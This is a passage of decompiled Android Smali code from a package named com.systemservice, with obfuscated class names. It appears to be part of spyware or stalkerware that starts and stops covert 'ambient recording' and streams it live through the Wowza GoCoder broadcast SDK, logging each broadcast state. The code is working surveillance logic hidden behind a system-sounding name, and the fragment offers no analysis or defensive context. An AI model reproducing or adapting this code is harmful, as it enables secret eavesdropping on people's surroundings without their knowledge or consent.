    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-virtual {p1, v1, p0}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;->startBroadcast(Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;Lcom/wowza/gocoder/sdk/api/status/WOWZStatusCallback;)Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;

    :goto_1
    iput v5, p0, Lcom/systemservice/a/c/c/e;->q:I

    goto :goto_2

    :cond_6
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    iget v1, p0, Lcom/systemservice/a/c/c/e;->q:I

    if-eqz v1, :cond_8

    iput v4, p0, Lcom/systemservice/a/c/c/e;->r:I

    iput v4, p0, Lcom/systemservice/a/c/c/e;->q:I

    iget-object v1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v2, "Stop Ambient Recording"

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/c/e;->d(Lcom/systemservice/a/d/b;)V

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->g:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;

    invoke-virtual {p1}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcastConfig;->validateForBroadcast()Lcom/wowza/gocoder/sdk/api/errors/WOWZStreamingError;

    move-result-object p1

    if-eqz p1, :cond_7

    goto :goto_2

    :cond_7
    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->f:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

    invoke-virtual {p1}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;->getStatus()Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;

    move-result-object p1

    invoke-virtual {p1}, Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;->isRunning()Z

    move-result p1

    if-eqz p1, :cond_8

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->f:Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;

    invoke-virtual {p1, p0}, Lcom/wowza/gocoder/sdk/api/broadcast/WOWZBroadcast;->endBroadcast(Lcom/wowza/gocoder/sdk/api/status/WOWZStatusCallback;)Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :cond_8
    :goto_2
    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 0

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    return-void
.end method

.method public b()V
    .locals 0

    return-void
.end method

.method public c()V
    .locals 0

    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/a/c/c/e;->d:[Ljava/lang/String;

    return-object v0
.end method

.method public onWZError(Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;)V
    .locals 2

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/systemservice/a/c/c/d;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/c/d;-><init>(Lcom/systemservice/a/c/c/e;Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public onWZStatus(Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;)V
    .locals 2

    new-instance v0, Ljava/lang/StringBuffer;

    const-string v1, "Broadcast status: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/wowza/gocoder/sdk/api/status/WOWZStatus;->getState()I

    move-result p1

    if-eqz p1, :cond_4

    const/4 v1, 0x1

    if-eq p1, v1, :cond_3

    const/4 v1, 0x2

    if-eq p1, v1, :cond_2

    const/4 v1, 0x3

    if-eq p1, v1, :cond_1

    const/4 v1, 0x4

    if-eq p1, v1, :cond_0

    return-void

    :cond_0
    const-string p1, "Broadcast shutting down"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "AMBIENT Broadcast status: Broadcast shutting down"

    goto :goto_0

    :cond_1
    const-string p1, "Streaming is active"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "AMBIENT Broadcast status: Streaming is active"

    goto :goto_0

    :cond_2
    const-string p1, "Ready to begin streaming"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "AMBIENT Broadcast status: Ready to begin streaming"

    goto :goto_0

    :cond_3
    const-string p1, "Broadcast initialization"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "AMBIENT Broadcast status: Broadcast initialization"

    goto :goto_0

    :cond_4
    const-string p1, "The broadcast is stopped"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    iget-object p1, p0, Lcom/systemservice/a/c/c/e;->p:Lorg/apache/log4j/Logger;

    const-string v1, "AMBIENT Broadcast status: The broadcast is stopped"

    :goto_0
    invoke-virtual {p1, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance p1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {p1, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/systemservice/a/c/c/c;

    invoke-direct {v1, p0, v0}, Lcom/systemservice/a/c/c/c;-><init>(Lcom/systemservice/a/c/c/e;Ljava/lang/StringBuffer;)V

    invoke-virtual {p1, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method
